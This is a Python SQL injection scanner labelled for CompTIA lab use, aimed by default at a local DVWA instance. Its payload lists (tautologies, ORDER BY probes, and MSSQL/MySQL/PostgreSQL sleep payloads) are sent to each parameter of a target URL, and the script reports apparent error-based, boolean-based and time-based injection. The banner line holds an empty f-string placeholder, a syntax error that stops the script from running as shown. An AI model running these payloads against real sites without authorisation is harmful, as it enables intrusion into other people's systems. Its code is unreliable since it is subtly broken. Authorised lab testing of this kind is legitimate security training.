#!/usr/bin/env python3
"""
SQL Injection Testing Script - For authorized lab environments only.
Intended for CompTIA PenTest+ / Security+ lab use.
"""

import requests
import sys
import time
from urllib.parse import urljoin


# Common SQL injection payloads
DETECTION_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
]

BOOLEAN_PAYLOADS = [
    ("' OR '1'='1", "' OR '1'='2"),   # true / false pair
    ("1 AND 1=1", "1 AND 1=2"),
    ("' AND 1=1--", "' AND 1=2--"),
]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlsyntaxerrorexception",
    "ora-01756",
    "sqlite3.operationalerror",
    "pg::syntaxerror",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
]


def get_baseline(session, url, params):
    """Fetch a clean response to compare against."""
    try:
        resp = session.get(url, params=params, timeout=10)
        return resp.status_code, len(resp.text), resp.text
    except requests.RequestException as e:
        print(f"  [!] Baseline request failed: {e}")
        return None, None, None


def check_error_based(response_text):
    """Check if response contains SQL error messages."""
    text_lower = response_text.lower()
    for sig in ERROR_SIGNATURES:
        if sig in text_lower:
            return True, sig
    return False, None


def test_error_based(session, url, param, params):
    """Inject each payload and look for SQL error messages."""
    print(f"\n  [*] Error-based injection on param: '{param}'")
    findings = []

    for payload in DETECTION_PAYLOADS:
        test_params = params.copy()
        test_params[param] = payload
        try:
            resp = session.get(url, params=test_params, timeout=10)
            triggered, sig = check_error_based(resp.text)
            if triggered:
                print(f"    [+] VULNERABLE — payload: {payload!r}")
                print(f"        Error signature: {sig!r}")
                findings.append({"payload": payload, "signature": sig, "type": "error-based"})
            time.sleep(0.3)
        except requests.RequestException as e:
            print(f"    [!] Request error: {e}")

    return findings


def test_boolean_based(session, url, param, params, baseline_len):
    """Compare true/false payload responses to detect boolean injection."""
    print(f"\n  [*] Boolean-based injection on param: '{param}'")
    findings = []

    for true_payload, false_payload in BOOLEAN_PAYLOADS:
        try:
            true_params = params.copy()
            true_params[param] = true_payload
            true_resp = session.get(url, params=true_params, timeout=10)

            false_params = params.copy()
            false_params[param] = false_payload
            false_resp = session.get(url, params=false_params, timeout=10)

            len_true = len(true_resp.text)
            len_false = len(false_resp.text)
            diff = abs(len_true - len_false)

            if diff > 50:  # significant content difference
                print(f"    [+] LIKELY VULNERABLE — true/false response length differs by {diff} chars")
                print(f"        True payload : {true_payload!r} → {len_true} chars")
                print(f"        False payload: {false_payload!r} → {len_false} chars")
                findings.append({
                    "true_payload": true_payload,
                    "false_payload": false_payload,
                    "diff": diff,
                    "type": "boolean-based",
                })

            time.sleep(0.3)
        except requests.RequestException as e:
            print(f"    [!] Request error: {e}")

    return findings


def test_time_based(session, url, param, params, threshold=4):
    """Use sleep payloads to detect time-based blind injection."""
    print(f"\n  [*] Time-based blind injection on param: '{param}'")
    findings = []

    sleep_payloads = [
        "'; WAITFOR DELAY '0:0:5'--",       # MSSQL
        "' OR SLEEP(5)--",                   # MySQL
        "'; SELECT pg_sleep(5)--",           # PostgreSQL
        "1; WAITFOR DELAY '0:0:5'--",
        "1 OR SLEEP(5)",
    ]

    for payload in sleep_payloads:
        test_params = params.copy()
        test_params[param] = payload
        try:
            start = time.time()
            session.get(url, params=test_params, timeout=15)
            elapsed = time.time() - start

            if elapsed >= threshold:
                print(f"    [+] LIKELY VULNERABLE — response delayed {elapsed:.1f}s")
                print(f"        Payload: {payload!r}")
                findings.append({"payload": payload, "delay": elapsed, "type": "time-based"})
        except requests.Timeout:
            print(f"    [+] LIKELY VULNERABLE — request timed out (sleep payload: {payload!r})")
            findings.append({"payload": payload, "delay": ">timeout", "type": "time-based"})
        except requests.RequestException as e:
            print(f"    [!] Request error: {e}")

        time.sleep(0.5)

    return findings


def scan(target_url, params: dict, test_types=("error", "boolean", "time")):
    """
    Run SQL injection tests against each parameter.

    Args:
        target_url: Full URL to test (e.g. http://lab.local/login.php)
        params:     Dict of query parameters (e.g. {"id": "1", "user": "admin"})
        test_types: Which techniques to run ("error", "boolean", "time")
    """
    print("=" * 60)
    print("  SQL Injection Tester — Authorized Lab Use Only")
    print("=" * 60)
    print(f"  Target : {}")
    print(f"  Params : {list(params.keys())}")
    print(f"  Tests  : {', '.join(test_types)}")
    print("=" * 60)

    session = requests.Session()
    session.headers.update({"User-Agent": "SQLi-Lab-Tester/1.0"})

    all_findings = {}

    for param in params:
        print(f"\n[>] Testing parameter: '{param}'")
        _, baseline_len, _ = get_baseline(session, target_url, params)
        param_findings = []

        if "error" in test_types:
            param_findings += test_error_based(session, target_url, param, params)

        if "boolean" in test_types:
            param_findings += test_boolean_based(session, target_url, param, params, baseline_len)

        if "time" in test_types:
            param_findings += test_time_based(session, target_url, param, params)

        all_findings[param] = param_findings

    print("\n" + "=" * 60)
    print("  RESULTS SUMMARY")
    print("=" * 60)
    for param, findings in all_findings.items():
        if findings:
            print(f"  [VULNERABLE] '{param}' — {len(findings)} finding(s)")
            for f in findings:
                print(f"    • {f['type']} — payload: {f.get('payload', f.get('true_payload', 'N/A'))!r}")
        else:
            print(f"  [CLEAN]      '{param}' — no injection detected")
    print("=" * 60)

    return all_findings


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    # Edit these values to match your CompTIA lab target
    TARGET_URL = "http://localhost/vulnerabilities/sqli/"   # DVWA example
    PARAMS     = {"id": "1", "Submit": "Submit"}

    # Run all three test types; remove any you don't need
    scan(TARGET_URL, PARAMS, test_types=("error", "boolean", "time"))
